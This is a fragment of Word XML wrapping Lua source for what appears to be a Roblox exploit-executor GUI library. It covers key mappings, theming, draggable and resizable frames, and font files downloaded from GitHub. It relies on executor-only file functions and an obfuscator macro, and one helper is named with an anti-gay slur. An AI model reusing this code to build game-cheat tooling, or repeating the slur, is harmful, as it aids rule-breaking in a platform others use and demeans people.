      <w:r>
        <w:t xml:space="preserve">    local min = math.min </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local abs = math.abs </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local noise = math.noise</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rad = math.rad </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local random = math.random </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local pow = math.pow </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local sin = math.sin </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local pi = math.pi </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local tan = math.tan </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local atan2 = math.atan2 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local clamp = math.clamp </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local insert = table.insert </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local find = table.find </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local remove = table.remove</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local concat = table.concat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">-- </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- Library init</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local themes = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        preset = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            accent = rgb(255,255,255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        }, </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        utility = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            accent = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundColor3 = {}, </w:t>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TextColor3 = {}, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ImageColor3 = {}, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ScrollBarImageColor3 = {} </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },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local keys = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftShift] = "LS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightShift] = "RS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftControl] = "LC",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightControl] = "RC",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Insert] = "INS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Backspace] = "BS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Return] = "Ent",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftAlt] = "LA",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightAlt] = "RA",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.CapsLock] = "CAPS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.One] = "1",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Two] = "2",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Three] = "3",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Four] = "4",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Five] = "5",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Six] = "6",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Seven] = "7",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Eight] = "8",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Nine] = "9",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Zero] = "0",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadOne] = "Num1",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadTwo] = "Num2",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadThree] = "Num3",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadFour] = "Num4",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadFive] = "Num5",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadSix] = "Num6",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadSeven] = "Num7",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadEight] = "Num8",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadNine] = "Num9",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadZero] = "Num0",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Minus] = "-",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Equals] = "=",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Tilde] = "~",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftBracket] = "[",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightBracket] = "]",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightParenthesis] = ")",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftParenthesis] = "(",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Semicolon] = ",",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Quote] = "'",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.BackSlash] = "\\",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Comma] = ",",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Period] = ".",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Slash] = "/",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Asterisk] = "*",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Plus] = "+",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Period] = ".",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Backquote] = "`",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.UserInputType.MouseButton1] = "MB1",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.UserInputType.MouseButton2] = "MB2",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.UserInputType.MouseButton3] = "MB3",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Escape] = "ESC",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Space] = "SPC",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.End] = "END",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    library.__index = library</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local flags = library.flags </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local config_flags = library.config_flags</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local notifications = library.notifications </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local fonts = {}; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function Register_Font(Name, Weight, Style, Asset)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not isfile(Asset.Id) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                writefile(Asset.Id, Asset.Font)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if isfile(Name .. ".font") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                delfile(Name .. ".font")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Data = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = Name,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                faces = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        name = "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        weight = Weight,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        style = Style,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        assetId = getcustomasset(Asset.Id),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            writefile(Name .. ".font", http_service:JSONEncode(Data))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return getcustomasset(Name .. ".font");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local Medium = Register_Font("Medium", 200, "Normal", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Id = "Medium.ttf",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Font = game:HttpGet("https://github.com/i77lhm/storage/raw/refs/heads/main/fonts/Inter_28pt-Medium.ttf"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SemiBold = Register_Font("SemiBold", 200, "Normal", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Id = "SemiBold.ttf",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Font = game:HttpGet("https://github.com/i77lhm/storage/raw/refs/heads/main/fonts/Inter_28pt-SemiBold.ttf"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        fonts = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            small = Font.new(Medium, Enum.FontWeight.Regular, Enum.FontStyle.Normal);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            font = Font.new(SemiBold, Enum.FontWeight.Regular, Enum.FontStyle.Normal);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">-- Library functions </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    -- Misc functions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:tween(obj, properties, easing_style, time) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local tween = tween_service:Create(obj, TweenInfo.new(time or 0.25, easing_style or Enum.EasingStyle.Quint, Enum.EasingDirection.InOut, 0, false, 0), properties):Play()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return tween</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:resizify(frame) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Frame = Instance.new("TextButton")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.Position = dim2(1, -10, 1, -10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.BorderColor3 = rgb(0, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.Size = dim2(0, 10, 0, 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.BorderSizePixel = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.Parent = frame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.BackgroundTransparency = 1 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.Text = ""</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local resizing = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local start_size </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local start </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local og_size = frame.Size  </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.MouseButton1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    resizing = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    start = input.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    start_size = frame.Size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Frame.InputEnded:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.MouseButton1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    resizing = false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library:connection(uis.InputChanged, function(input, game_event) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if resizing and input.UserInputType == Enum.UserInputType.MouseMovement then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local viewport_x = camera.ViewportSize.X</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local viewport_y = camera.ViewportSize.Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local current_size = dim2(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        start_size.X.Scale,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        math.clamp(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            start_size.X.Offset + (input.Position.X - start.X),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            og_size.X.Offset,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            viewport_x</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        start_size.Y.Scale,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        math.clamp(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            start_size.Y.Offset + (input.Position.Y - start.Y),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            og_size.Y.Offset,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            viewport_y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        )</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(frame, {Size = current_size}, Enum.EasingStyle.Linear, 0.05)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end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function fag(tbl)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Size = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _ in tbl do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = Size + 1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return Size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function library:next_flag()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local index = fag(library.flags) + 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local str = string.format("flagnumber%s", index)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return str;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:mouse_in_frame(uiobject)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local y_cond = uiobject.AbsolutePosition.Y &lt;= mouse.Y and mouse.Y &lt;= uiobject.AbsolutePosition.Y + uiobject.AbsoluteSize.Y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local x_cond = uiobject.AbsolutePosition.X &lt;= mouse.X and mouse.X &lt;= uiobject.AbsolutePosition.X + uiobject.AbsoluteSize.X</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return (y_cond and x_cond)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:draggify(frame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dragging = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local start_size = frame.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local start </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            frame.InputBegan:Connect(LPH_NO_VIRTUALIZE(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.MouseButton1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    start = input.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    start_size = frame.Position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frame.InputEnded:Connect(LPH_NO_VIRTUALIZE(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.MouseButton1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging = false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library:connection(uis.InputChanged, LPH_NO_VIRTUALIZE(function(input, game_event) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local viewport_x = camera.ViewportSize.X</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local viewport_y = camera.ViewportSize.Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local current_position = dim2(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        clamp(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            start_size.X.Offset + (input.Position.X - start.X),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            viewport_x - frame.Size.X.Offset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        math.clamp(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            start_size.Y.Offset + (input.Position.Y - start.Y),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            viewport_y - frame.Size.Y.Offset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        )</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(frame, {Position = current_position}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:close_element()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end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:convert(str)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local values = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for value in string.gmatch(str, "[^,]+") do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                insert(values, tonumber(value))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if #values == 4 then              </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return unpack(values)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return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function library:convert_enum(enum)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local enum_parts = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for part in string.gmatch(enum, "[%w_]+") do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                insert(enum_parts, part)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local enum_table = Enum</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for i = 2, #enum_parts do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local enum_item = enum_table[enum_parts[i]]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                enum_table = enum_item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return enum_table</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local config_holder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:update_config_list() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not config_holder then </w:t>
      </w:r>
    </w:p>
    <w:p>
